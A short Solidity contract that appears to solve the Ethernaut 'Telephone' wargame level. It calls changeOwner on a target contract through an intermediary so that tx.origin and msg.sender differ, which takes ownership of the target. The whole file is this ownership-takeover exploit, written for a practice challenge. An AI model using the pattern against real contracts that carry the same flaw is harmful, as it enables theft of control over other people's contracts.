// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";
import "./Telephone.sol";

contract ChangeTelephoneOwner {

  address public owner;
  Telephone tel;

  constructor() {
    owner = msg.sender;
  }

  function callChangeOwner(address _targetContract) public {
    
    console.log("1. ", msg.sender, tx.origin);
    (bool status, ) = _targetContract.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
  }
}